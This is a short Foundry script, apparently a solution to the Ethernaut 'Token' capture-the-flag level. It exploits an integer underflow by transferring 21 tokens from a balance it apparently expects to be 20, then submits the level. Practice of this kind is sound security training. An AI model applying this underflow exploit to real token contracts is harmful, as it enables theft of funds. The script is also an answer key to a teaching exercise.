pragma solidity ^0.8.10;

import {Script, console2} from "forge-std/Script.sol";
import "../src/Token/TokenFactory.sol";
import "../src/Ethernaut.sol";

contract TokenScript is Script {
    Ethernaut ethernaut;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        ethernaut = new Ethernaut();
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress));

        assert(ethernautToken.transfer(levelAddress, 21));

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);
        vm.stopBroadcast();
    }
}
